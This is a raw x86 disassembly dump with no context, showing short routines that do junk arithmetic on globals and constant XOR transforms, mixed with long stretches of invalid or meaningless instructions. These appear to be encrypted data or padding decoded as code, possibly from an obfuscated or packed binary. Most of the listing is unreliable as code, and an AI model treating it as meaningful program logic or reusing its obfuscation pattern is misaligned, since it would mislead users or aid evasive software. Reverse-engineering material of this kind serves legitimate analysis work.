  408265:	stos   BYTE PTR es:[edi],al
  408266:	jae    0x4081fe
  408268:	or     ah,bl
  40826a:	cmp    cl,BYTE PTR [edi-0x36]
  40826d:	or     DWORD PTR [eax+eiz*2-0x6d],edi
  408271:	mov    ds:0x74c79862,eax
  408276:	inc    ebp
  408277:	sub    cl,BYTE PTR [ebp-0x32c7577b]
  40827d:	imul   esi,DWORD PTR [esi+0x6d339563],0x6299e924
  408287:	add    edx,DWORD PTR [eax]
  408289:	lock retf 
  40828b:	cmc    
  40828c:	xchg   BYTE PTR [esp+ecx*4],al
  40828f:	loop   0x408241
  408291:	adc    al,0x73
  408293:	adc    eax,0x16bb1841
  408298:	pop    esi
  408299:	cmp    eax,0xed00445d
  40829e:	aas    
  40829f:	or     ah,0x22
  4082a2:	sar    DWORD PTR [edi],0x4b
  4082a5:	mov    ebp,gs
  4082a7:	lahf   
  4082a8:	xor    BYTE PTR [ebp+0x1c],al
  4082ab:	mov    gs,WORD PTR [edi-0x4f087a4]
  4082b1:	and    BYTE PTR [esi+0x1eb6d4fe],dh
  4082b7:	jne    0x40826d
  4082b9:	jecxz  0x40829d
  4082bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082bc:	mov    cl,0x20
  4082be:	dec    ebx
  4082bf:	sub    al,0x8b
  4082c1:	or     edx,DWORD PTR [ebx+0x17bbb0e8]
  4082c7:	cmp    cl,BYTE PTR [edx-0x1b]
  4082ca:	xor    DWORD PTR ds:0x2af1d13e,ebx
  4082d0:	sub    ebp,DWORD PTR [ebx+0x3e8b4683]
  4082d6:	fsubr  QWORD PTR [esi-0x16d58f2e]
  4082dc:	sub    BYTE PTR [eax+ecx*1],bh
  4082df:	fisttp WORD PTR [ecx-0x42c9afe2]
  4082e5:	jmp    0xffa283bb
  4082ea:	jg     0x408287
  4082ec:	jb     0x40830f
  4082ee:	push   ecx
  4082ef:	pushf  
  4082f0:	jo     0x408289
  4082f2:	jne    0x4082b2
  4082f4:	popa   
  4082f5:	jns    0x40828a
  4082f7:	pop    ds
  4082f8:	jne    0x408341
  4082fa:	cmp    BYTE PTR [edx+0x50946480],0x7b
  408301:	addr16 mov edx,0x48e7fb10
  408307:	aad    0x5e
  408309:	or     DWORD PTR [ebp-0x54ec3808],0xffffffbb
  408310:	add    DWORD PTR [eax+0x4f],esp
  408313:	out    0x65,eax
  408315:	or     bh,bl
  408317:	push   eax
  408318:	mov    edx,0xfc4d7c82
  40831d:	or     al,BYTE PTR [eax]
  40831f:	gs (bad) 
  408321:	icebp  
  408322:	pusha  
  408323:	out    dx,al
  408324:	dec    esp
  408325:	inc    esi
  408326:	xchg   ebx,eax
  408327:	cli    
  408328:	int3   
  408329:	aad    0x8b
  40832b:	dec    esi
  40832c:	lea    eax,[eax+edx*1+0x32729d]
  408333:	mov    DWORD PTR [ebp+0x8],eax
  408336:	inc    DWORD PTR [ebp+0xc]
  408339:	jmp    0x407e52
  40833e:	mov    eax,DWORD PTR [ebp-0x10]
  408341:	xor    eax,ecx
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e7f2
  408366:	adc    DWORD PTR ds:0x42e7e2,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x4305c2,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e7ee,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e7ee
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x430526,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43050a
  4083aa:	or     DWORD PTR ds:0x42ee8c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ee90,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43050e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e7e6,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43051a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e7f6,0x42e7ee
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e7ee,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43050e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43050e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43050e,esi
  408424:	cmp    DWORD PTR ds:0x43050e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42ea88
  40844d:	cmp    DWORD PTR ds:0x43050e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	icebp  
  40847e:	jne    0x40849a
  408480:	mov    al,ds:0x7e7edc61
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x4084ac
  40848a:	je     0x40843a
  40848c:	pop    edi
  40848d:	pop    ss
  40848e:	ja     0x40842c
  408490:	xor    al,0x11
  408492:	fwait
  408493:	dec    ecx
  408494:	aad    0x9f
  408496:	sub    eax,0x6773b03b
  40849b:	push   ds
  40849c:	je     0x4084e4
  40849e:	ficomp WORD PTR [edi-0x54]
  4084a1:	imul   eax,DWORD PTR [ebx+0x47],0xffffff8e
  4084a5:	xor    eax,0x9bd174d2
  4084aa:	push   edx
  4084ac:	das    
  4084ad:	fcomp  st(4)
  4084af:	push   0x65a935ba
  4084b4:	test   al,0x61
  4084b6:	mov    DWORD PTR [edx+0x5417e5cb],esp
  4084bc:	adc    edx,DWORD PTR [edx+eiz*1-0x37]
  4084c0:	imul   ecx,DWORD PTR [ecx+0x29],0x5e05d0f4
  4084c7:	addr16 dec esi
  4084c9:	add    BYTE PTR [ecx+0x62b2ed69],0x2
  4084d0:	fdiv   QWORD PTR [ebx-0x6d5224a8]
  4084d6:	out    0x62,al
  4084d8:	add    eax,0xccb08ed9
  4084dd:	sti    
  4084de:	int    0xd7
  4084e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084e1:	lock xchg DWORD PTR fs:[esi-0x21347599],ebp
  4084e9:	sbb    bh,BYTE PTR [ecx+0x37c7393b]
  4084ef:	or     DWORD PTR [ecx],0xffffffb6
  4084f2:	lods   al,BYTE PTR ds:[esi]
  4084f3:	xor    DWORD PTR [ebx-0x151152ad],edi
  4084f9:	scas   eax,DWORD PTR es:[edi]
  4084fa:	jl     0x4084eb
  4084fc:	outs   dx,DWORD PTR ds:[esi]
  4084fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084fe:	adc    eax,0x3c808573
  408503:	es sti 
  408505:	idiv   eax
  408507:	shr    BYTE PTR [ecx-0x57bbc658],0x39
  40850e:	mov    es,WORD PTR [ebp+0x3f]
  408511:	repnz stos BYTE PTR es:[edi],al
  408513:	out    0x4f,al
  408515:	js     0x4084b8
  408517:	inc    edx
  408518:	adc    edx,0x5fc0f2a9
  40851e:	push   ecx
  40851f:	lock or ebx,DWORD PTR [edx+eax*4+0x752dfc53]
  408527:	and    BYTE PTR [esi+0x4c],ch
  40852a:	dec    ebp
  40852b:	jo     0x40857c
  40852d:	test   BYTE PTR [eax-0x23],ch
  408530:	push   ss
  408531:	imul   edi,DWORD PTR ds:0xfa2fb332,0xffffffe7
  408538:	sahf   
  408539:	stos   DWORD PTR es:[edi],eax
  40853a:	xor    BYTE PTR [ebx],ah
  40853c:	cmp    ebp,esi
  40853e:	mov    cl,0x15
  408540:	test   ebx,esi
  408542:	sub    al,0x95
  408544:	fwait
  408545:	cmp    eax,0xafd35dd9
  40854a:	and    edi,DWORD PTR ds:0xf47376cb
  408550:	mov    al,ds:0x6286ed6b
  408555:	leave  
  408556:	ror    BYTE PTR [ebp-0x607294e5],cl
  40855c:	xchg   edx,eax
  40855d:	bound  esp,QWORD PTR [ebp-0x12]
  408560:	outs   dx,BYTE PTR ds:[esi]
  408561:	lds    edi,FWORD PTR [ebx+0xd41e4c4]
  408567:	lds    eax,FWORD PTR [edi-0x3a]
  40856a:	xor    eax,0xab673a6f
  40856f:	fnstenv [ecx+0x74]
  408572:	mov    ds:0x8bc8d538,eax
  408577:	sub    edx,DWORD PTR [eax]
  408579:	and    al,0xfc
  40857b:	adc    BYTE PTR [esi],bh
  40857d:	jp     0x4085a5
  40857f:	mov    ecx,0xd420115c
  408584:	loopne 0x40858e
  408586:	or     al,0xd7
  408588:	cmp    BYTE PTR [edi],ch
  40858a:	dec    edi
  40858b:	mov    ah,0x87
  40858d:	mul    BYTE PTR [edx+0xd2c7815]
  408593:	sub    esp,DWORD PTR ds:0xbc05a0c7
  408599:	cli    
  40859a:	pushf  
  40859b:	test   ah,bh
  40859d:	cmp    al,0xda
  40859f:	add    dh,al
  4085a1:	cdq    
  4085a2:	(bad)  
  4085a4:	mov    esi,0xd929f1f8
  4085a9:	cli    
  4085aa:	fnstcw WORD PTR [ebp-0x1b0cad86]
  4085b0:	jne    0x40855a
  4085b2:	jl     0x408561
  4085b4:	cld    
  4085b5:	fild   DWORD PTR [esi-0x67]
  4085b8:	int3   
  4085b9:	popf   
  4085ba:	ret    0xe633
  4085bd:	dec    ebp
  4085be:	stos   DWORD PTR es:[edi],eax
  4085bf:	rol    edx,1
  4085c1:	sahf   
  4085c2:	pop    esp
  4085c3:	sub    eax,0xa4b1b10f
  4085c8:	sbb    dl,dl
  4085ca:	dec    esp
  4085cb:	sub    bl,al
  4085cd:	cmp    eax,0xda1d64ad
  4085d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085d3:	(bad)  
  4085d4:	pusha  
  4085d5:	rcr    DWORD PTR [ecx+0x16],cl
  4085d8:	pusha  
  4085d9:	fist   WORD PTR [ecx-0x1242213b]
  4085df:	pop    ebp
  4085e0:	dec    ebx
  4085e1:	push   0x18fa7673
  4085e6:	neg    BYTE PTR [ecx]
  4085e8:	push   esp
  4085e9:	sub    eax,0xeddad379
  4085ee:	push   ecx
  4085ef:	arpl   WORD PTR [ecx],cx
  4085f1:	push   0x74080951
  4085f6:	cmp    DWORD PTR [edx],ecx
  4085f8:	dec    edi
  4085f9:	xlat   BYTE PTR ds:[ebx]
  4085fa:	in     al,dx
  4085fb:	add    DWORD PTR [edx+0x76],edi
  4085fe:	push   ds
  4085ff:	repz jecxz 0x40864b
  408602:	outs   dx,BYTE PTR ds:[esi]
  408603:	mov    edx,DWORD PTR [eax-0xede8b40]
  408609:	retf   
  40860a:	(bad)  
  40860b:	enter  0x168,0x50
  40860f:	je     0x408618
  408611:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408613:	mov    edx,0x960af927
  408618:	arpl   WORD PTR [ebp+0x75],di
  40861b:	mov    ch,0x4c
  40861d:	jp     0x408648
  40861f:	jns    0x4085c1
  408621:	lea    ebx,[eax]
  408623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408624:	sbb    eax,DWORD PTR [esi+0x5201e321]
  40862a:	xor    eax,0xcb34d0c8
  40862f:	dec    edi
  408630:	adc    al,0xd2
  408632:	cmp    BYTE PTR [eax+0x15],dh
  408635:	mov    DWORD PTR [edx],0x158126f
  40863b:	daa    
  40863c:	sub    ebx,0x4a
  40863f:	pop    esi
  408640:	out    dx,al
  408641:	sub    eax,0xe4511fe6
  408646:	fimul  DWORD PTR [ebp-0x2e3a72f]
  40864c:	inc    esi
  40864d:	pop    es
  40864e:	pop    ss
  40864f:	and    DWORD PTR [edx],ebp
  408651:	push   eax
  408652:	mov    edx,0x25f66aff
  408657:	sbb    esp,DWORD PTR [esi-0xf3e0c53]
  40865d:	dec    edi
  40865e:	sub    al,0xaf
  408660:	xor    eax,0x438630c3
  408665:	repz fisub DWORD PTR [esi-0x40]
  408669:	rcr    eax,0x37
  40866c:	out    0x4e,eax
  40866e:	sti    
  40866f:	mov    bl,0xe0
  408671:	push   esi
  408672:	jnp    0x408628
  408674:	mov    BYTE PTR [esi+ecx*1],bh
  408677:	push   0x702ae7ee
  40867c:	sbb    BYTE PTR [ebx],ah
  40867e:	inc    ebx
  40867f:	sub    eax,0x386d3ff9
  408684:	inc    esp
  408685:	clc    
  408686:	push   ds
  408687:	xchg   ebp,eax
  408688:	xchg   ebp,eax
  408689:	push   ds
  40868a:	(bad)  
  40868b:	jl     0x408647
  40868d:	dec    ecx
  40868e:	aad    0x40
  408690:	xchg   ecx,eax
  408691:	adc    al,0xe
  408693:	push   ds
  408694:	sub    BYTE PTR [ebx-0x7a99ac44],bh
  40869a:	addr16 cdq 
  40869c:	jne    0x408701
  40869e:	pop    esp
  40869f:	fs mov ebx,0xffdf854d
  4086a5:	out    dx,al
  4086a6:	sub    cl,BYTE PTR [esp+eax*8+0x67]
  4086aa:	call   0xec74f00
  4086af:	stos   DWORD PTR es:[edi],eax
  4086b0:	shr    DWORD PTR [ebx-0x1d],0xf2
  4086b4:	(bad)
  4086b7:	(bad)  
  4086b8:	jnp    0x4086cd
  4086ba:	or     DWORD PTR [edi+0x6],0x9783b080
  4086c1:	jbe    0x408682
  4086c3:	push   eax
  4086c4:	adc    edi,DWORD PTR [esi]
  4086c6:	test   bl,dl
  4086c8:	js     0x408666
  4086ca:	xor    esp,DWORD PTR [edx]
  4086cc:	xchg   edx,eax
  4086cd:	mov    al,ds:0x9c26a471
  4086d2:	mov    eax,ds:0xc4258efb
  4086d7:	ret    
  4086d8:	lahf   
  4086d9:	out    0x8,al
  4086db:	dec    edi
  4086dc:	xchg   ebx,eax
  4086dd:	mov    bl,0xc7
  4086df:	aas    
  4086e0:	dec    ecx
  4086e1:	fsub   DWORD PTR [eax-0x11585836]
  4086e7:	xor    eax,esp
  4086e9:	pop    ds
  4086ea:	fnsave [edi+0x75]
  4086ed:	aaa    
  4086ee:	cmp    edi,DWORD PTR [edx+eax*2-0x22]
  4086f2:	and    bl,BYTE PTR [eax-0x5f0fb436]
  4086f8:	mov    edi,0xeb5b1be
  4086fd:	xchg   ecx,eax
  4086fe:	or     bl,dh
  408700:	jmp    DWORD PTR [ecx-0x1e]
  408703:	in     al,0x2f
  408705:	movntq (bad),mm1
  408706:	out    0xca,eax
  408708:	mov    ebx,DWORD PTR [esi-0xecb955d]
  40870e:	mov    ch,0x8a
  408710:	mov    eax,ds:0x924d854f
  408715:	outs   dx,DWORD PTR ds:[esi]
  408716:	jp     0x40872f
  408718:	out    dx,al
  408719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40871a:	fmul   DWORD PTR [edi]
  40871c:	dec    esi
  40871d:	loopne 0x4086d0
  40871f:	push   cs
  408720:	cmc    
  408721:	inc    DWORD PTR [ecx+0x5a]
  408724:	sub    eax,0x920e45b4
  408729:	fwait
  40872a:	mov    WORD PTR [ebp-0x26b2b2e9],fs
  408730:	or     ebx,esi
  408732:	jle    0x40874a
  408734:	rcr    cl,cl
  408736:	int3   
  408737:	(bad)  
  408739:	int    0x5e
  40873b:	push   ecx
  40873c:	sbb    dl,BYTE PTR [eax-0x6ce29e6c]
  408742:	(bad)  
  408743:	mov    dh,0x21
  408745:	cli    
  408746:	mov    BYTE PTR [ecx+ebp*1-0x18],bh
  40874a:	dec    esi
  40874b:	lock jae 0x4087bc
  40874e:	pop    ebx
  40874f:	ds xchg ecx,eax
  408751:	or     ah,BYTE PTR [ebp-0x6380c4fd]
  408757:	gs jnp 0x408782
  40875a:	mov    al,0xac
  40875c:	mov    bl,0xf3
  40875e:	push   esp
  40875f:	icebp  
  408760:	inc    ecx
  408761:	rcr    DWORD PTR [edi+ebx*8+0x3b],1
  408765:	dec    esi
  408766:	fild   DWORD PTR [esi-0x3d]
  408769:	addr16 push es
  40876b:	xor    edx,edx
  40876d:	mov    ecx,0x7264fcad
  408772:	div    ecx
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	bound  edi,QWORD PTR [ecx+0x43424a9a]
  40878f:	fistp  QWORD PTR [esi+0x7e]
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x408748
  408797:	(bad)  
  408799:	nop
  40879a:	sbb    bh,bl
  40879c:	jle    0x408757
  40879e:	fisttp DWORD PTR [edx+0x2a]
  4087a1:	enter  0x50d9,0x87
  4087a5:	loop   0x4087b4
  4087a7:	inc    ebx
  4087a8:	and    al,0x27
  4087aa:	popf   
  4087ab:	fnsave [edi+0x3b396954]
  4087b1:	dec    esp
  4087b2:	add    eax,0x8eb2db8a
  4087b7:	mov    al,BYTE PTR [ebx-0x3de42794]
  4087bd:	inc    ebx
  4087be:	xchg   ebx,eax
  4087bf:	sub    dl,BYTE PTR [eax-0x5a]
  4087c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087c3:	push   0x43ae3d79
  4087c8:	push   esp
  4087c9:	ficom  WORD PTR [ecx-0x51]
  4087cc:	outs   dx,DWORD PTR ds:[esi]
  4087cd:	into   
  4087ce:	push   0x2c
  4087d0:	dec    ecx
  4087d1:	mov    dl,BYTE PTR [ecx+0x61]
  4087d4:	adc    al,0x99
  4087d6:	not    BYTE PTR [eax]
  4087d8:	and    al,0x4
  4087da:	(bad)  
  4087db:	retf   
  4087dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087dd:	jge    0x40876e
  4087df:	jo     0x4087fa
  4087e1:	xchg   ch,ah
  4087e3:	jle    0x408786
  4087e5:	pop    es
  4087e6:	pop    ss
  4087e7:	es pop ss
  4087e9:	(bad)  
  4087ea:	mov    ebp,0xb9910f74
  4087ef:	sub    DWORD PTR [eax+0x3e2ddd04],ebp
  4087f5:	rcr    DWORD PTR [esi-0x5f],cl
  4087f8:	sbb    esi,DWORD PTR [ebp+0x25]
  4087fb:	das    
  4087fc:	sbb    esp,ebx
  4087fe:	mov    ah,0x5c
  408800:	popa   
  408801:	stos   DWORD PTR es:[edi],eax
  408802:	jl     0x4087fb
  408804:	add    WORD PTR [eax+0x4df5fbe9],cx
  40880b:	iret   
  40880c:	sub    ch,BYTE PTR [ebp-0x4232fe36]
  408812:	inc    eax
  408813:	call   0x4982be69
  408818:	outs   dx,DWORD PTR ds:[esi]
  408819:	inc    esp
  40881a:	mov    ah,0x14
  40881c:	sub    bl,BYTE PTR [ebx-0x7752382d]
  408822:	and    eax,0x913824a0
  408827:	(bad)  
  408828:	addr16 cmp dh,0xfa
  40882c:	imul   cl
  40882e:	clc    
  40882f:	push   ss
  408830:	dec    esp
  408831:	bound  edi,QWORD PTR [ebx]
  408833:	dec    ebx
  408834:	ror    DWORD PTR [ecx],0x77
  408837:	sbb    BYTE PTR [ebp+0x28f65c],ch
  40883d:	stc    
  40883e:	retf   0xf837
  408841:	fwait
  408842:	rcl    BYTE PTR [ebx+0x2d],cl
  408845:	pop    esp
  408846:	test   DWORD PTR [edx-0x75],0xe8ff7697
  40884d:	cmp    cl,bl
  40884f:	inc    ebp
  408850:	add    al,0xf
  408852:	mov    DWORD PTR ds:0x6c4d1359,ebx
  408858:	or     al,0x3b
  40885a:	test   al,0x6a
  40885c:	div    bh
  40885e:	or     eax,0xbd68bd26
  408863:	xchg   esp,eax
  408864:	add    DWORD PTR ds:0x7fc2755a,edx
  40886a:	sahf   
  40886b:	push   esp
  40886c:	jmp    0x6a7:0x4405969e
  408873:	stos   BYTE PTR es:[edi],al
  408874:	add    al,0x63
  408876:	std    
  408877:	icebp  
  408878:	push   ss
  408879:	outs   dx,BYTE PTR ds:[esi]
  40887a:	std    
  40887b:	ss test eax,0x8efd9474
  408881:	inc    ebp
  408882:	data16 sahf 
  408884:	jg     0x40886d
  408886:	pop    edi
  408887:	cs jecxz 0x408902
  40888a:	sbb    bh,dh
  40888c:	xor    bh,bh
  40888e:	cmp    DWORD PTR [ebx],ebx
  408890:	ror    DWORD PTR [ecx+esi*4],1
  408893:	lods   al,BYTE PTR ds:[esi]
  408894:	or     al,0x84
  408896:	push   0x9fedfff6
  40889b:	leave  
  40889c:	pop    ecx
  40889d:	outs   dx,DWORD PTR ds:[esi]
  40889e:	(bad)  
  40889f:	adc    edi,DWORD PTR [eax-0x40d9314a]
  4088a5:	bound  eax,QWORD PTR [edi]
  4088a7:	addr16 cdq 
  4088a9:	add    edx,DWORD PTR [esi+0x4]
  4088ac:	aam    0xb1
  4088ae:	mov    BYTE PTR [ecx-0x4f59c756],0xc4
  4088b5:	hlt    
  4088b6:	jmp    0xee50f238
  4088bb:	mov    ah,0xcb
  4088bd:	and    esp,ecx
  4088bf:	mov    al,ds:0xed55f618
  4088c4:	cmp    al,0xe7
  4088c6:	xchg   ebx,eax
  4088c7:	add    al,0x16
  4088c9:	shr    BYTE PTR [ecx+0x8ed3a25],cl
  4088cf:	repnz adc BYTE PTR [eax-0x55],al
  4088d3:	fisttp WORD PTR [edi+0x6d]
  4088d6:	mov    eax,ds:0xe407953
  4088db:	or     al,0x8
  4088dd:	jnp    0x408887
  4088df:	inc    esp
  4088e0:	pop    es
  4088e1:	sub    eax,0xa75fab59
  4088e6:	add    al,0xda
  4088e8:	and    dl,BYTE PTR [edi+ecx*4]
  4088eb:	or     BYTE PTR [esi-0x54],bh
  4088ee:	vpackssdw xmm4,xmm3,xmm3
  4088f2:	jnp    0x40891b
  4088f4:	test   al,0xfa
  4088f6:	xor    al,0x89
  4088f8:	inc    edx
  4088f9:	pop    eax
  4088fa:	mov    dh,0x7d
  4088fc:	mov    ch,0xbb
  4088fe:	or     DWORD PTR [ebp-0x33],0x3f2fd360
  408905:	imul   edx,ebp,0xec6fae32
  40890b:	loop   0x4088af
  40890d:	push   0xe
  40890f:	mov    gs,WORD PTR [ebp+0x23]
  408912:	mov    ds:0x896347a8,al
  408917:	xchg   edx,eax
  408918:	daa    
  408919:	repnz mov ds:0x7eb543d5,al
  40891f:	js     0x408961
  408921:	mov    ebp,0xa3445776
  408926:	outs   dx,BYTE PTR ds:[esi]
  408927:	fidivr WORD PTR [ebp+0x65]
  40892a:	les    esi,FWORD PTR [edx-0x5a]
  40892d:	das    
  40892e:	enter  0x9623,0x23
  408932:	out    dx,al
  408933:	cli    
  408934:	fmul   DWORD PTR cs:[esi]
  408937:	jbe    0x408996
  408939:	inc    edi
  40893a:	call   0x3c8b:0xbcdc9b55
  408941:	fstp   TBYTE PTR [eax-0x67]
  408944:	push   ecx
  408945:	repnz or al,0x3
  408948:	out    dx,eax
  408949:	xor    DWORD PTR [esi-0xa],esi
  40894c:	dec    esi
  40894d:	add    dh,ch
  40894f:	cdq    
  408950:	in     al,0x5e
  408952:	xor    BYTE PTR [edi+0x7d],bh
  408955:	mov    BYTE PTR [edi+0x26c0b494],0xea
  40895c:	pop    edx
  40895d:	outs   dx,BYTE PTR ds:[esi]
  40895e:	loope  0x4088f2
  408960:	in     eax,0x3f
  408962:	jge    0x408902
  408964:	adc    DWORD PTR [edi],esp
  408966:	pop    eax
  408967:	push   ebx
  408968:	in     al,0xdb
  40896a:	pop    esp
  40896b:	pop    ebp
  40896c:	xchg   edi,eax
  40896d:	cmp    BYTE PTR [ebx+edx*4],0x59
  408971:	cdq    
  408972:	mov    edx,0xef2aecb
  408977:	retf   0x1df4
  40897a:	mov    dl,0xf5
  40897c:	inc    ecx
  40897d:	mov    esp,0x3376f00
  408982:	xlat   BYTE PTR ds:[ebx]
  408983:	fs sahf 
  408985:	repz daa 
  408987:	inc    ecx
  408988:	fbld   TBYTE PTR [edx]
  40898a:	adc    bh,BYTE PTR [edi-0x73ef2052]
  408990:	rol    DWORD PTR [ebp-0x21812660],1
  408996:	sbb    eax,0x4b06461e
  40899b:	xchg   ecx,eax
  40899c:	shl    BYTE PTR [esi+0x1b32c7be],1
  4089a2:	mov    BYTE PTR [si+0x765e],ah
  4089a7:	scas   al,BYTE PTR es:[edi]
  4089a8:	xchg   edx,eax
  4089a9:	mul    DWORD PTR [edx+esi*8]
  4089ac:	adc    BYTE PTR [ecx+eiz*4+0x69],0x7f
  4089b1:	fistp  WORD PTR [esi]
  4089b3:	dec    esp
  4089b4:	cmp    eax,0x5fc61cd9
  4089b9:	stc    
  4089ba:	dec    edx
  4089bb:	std    
  4089bc:	ret    
  4089bd:	sbb    bl,0x68
  4089c0:	mov    bl,0xa7
  4089c2:	pop    ebx
  4089c3:	inc    ebp
  4089c4:	int3   
  4089c5:	stc    
  4089c6:	loope  0x408a26
  4089c8:	sbb    ebx,esp
  4089ca:	push   ds
  4089cb:	data16 mov al,ds:0xfc25485e
  4089d1:	fsubr  st,st(7)
  4089d3:	cmp    al,0x4
  4089d5:	icebp  
  4089d6:	in     eax,0x8b
  4089d8:	sub    BYTE PTR [edi-0x4fe4f885],ah
  4089de:	aam    0x99
  4089e0:	xchg   ecx,eax
  4089e1:	out    dx,eax
  4089e2:	cmp    edi,ebp
  4089e4:	inc    edx
  4089e5:	stos   DWORD PTR es:[edi],eax
  4089e6:	mov    ebp,0x87b39da5
  4089eb:	or     BYTE PTR [ebx],ah
  4089ed:	cmp    edx,DWORD PTR [ebx]
  4089ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089f0:	dec    edx
  4089f1:	and    al,0x7d
  4089f3:	(bad)
  4089f6:	jae    0x408998
  4089f8:	jmp    0xbdea:0x4dc0d22a
  4089ff:	loop   0x408a59
  408a01:	mov    DWORD PTR [edi-0x11d6a99d],ebx
  408a07:	out    dx,eax
  408a08:	in     al,0x6e
  408a0a:	pop    edi
  408a0b:	aaa    
  408a0c:	cmp    al,0x72
  408a0e:	pop    ds
  408a0f:	loopne 0x408a0e
  408a11:	nop
  408a12:	sbb    al,BYTE PTR [ecx+ebx*1-0x5a]
  408a16:	mov    ss,ecx
  408a18:	(bad)  
  408a19:	imul   edx,DWORD PTR [edi+edx*4+0x66e739a4],0x3f
  408a21:	xchg   esp,eax
  408a22:	dec    esp
  408a23:	xor    al,0x4a
  408a25:	fisub  WORD PTR [edi]
  408a27:	inc    edi
  408a28:	or     BYTE PTR [eax+0x4f0b5a26],0xf8
  408a2f:	scas   al,BYTE PTR es:[edi]
  408a30:	in     eax,0xb5
  408a32:	add    ah,al
  408a34:	int3   
  408a35:	push   0x33086009
  408a3a:	addr16 out dx,al
  408a3c:	ret    
  408a3d:	sbb    al,0x61
  408a3f:	jp     0x4089e1
  408a41:	xor    al,0xb4
  408a43:	sbb    bl,BYTE PTR [ecx+0x59392e1d]
  408a49:	and    esp,DWORD PTR [ebx]
  408a4b:	dec    edx
  408a4c:	das    
  408a4d:	lods   eax,DWORD PTR ds:[esi]
  408a4e:	stos   DWORD PTR es:[edi],eax
  408a4f:	cmc    
  408a50:	sub    ebx,DWORD PTR [ebx]
  408a52:	mov    dl,0x85
  408a54:	pop    es
  408a55:	cmc    
  408a56:	rol    DWORD PTR [esi],0x5e
  408a59:	bswap  ebx
  408a5b:	jnp    0x408ac9
  408a5d:	ss popa 
  408a5f:	pop    ecx
  408a60:	inc    eax
  408a61:	or     eax,0x71ff8e9b
  408a66:	pop    ss
  408a67:	inc    edi
  408a68:	xor    ebp,DWORD PTR [ecx]
  408a6a:	(bad)  
  408a6b:	push   ds
  408a6c:	inc    bx
  408a6e:	push   edx
  408a6f:	jne    0x408a71
  408a71:	jmp    0x76849ea2
  408a76:	lock es or ecx,0x81161d8f
  408a7e:	mov    eax,ecx
  408a80:	pop    ebp
  408a81:	ret    0x18
  408a84:	push   ebp
  408a85:	mov    ebp,esp
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e7ea,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e7ea,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e7ea,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430516
  408ab1:	push   0x42eeb0
  408ab6:	push   0x69fb
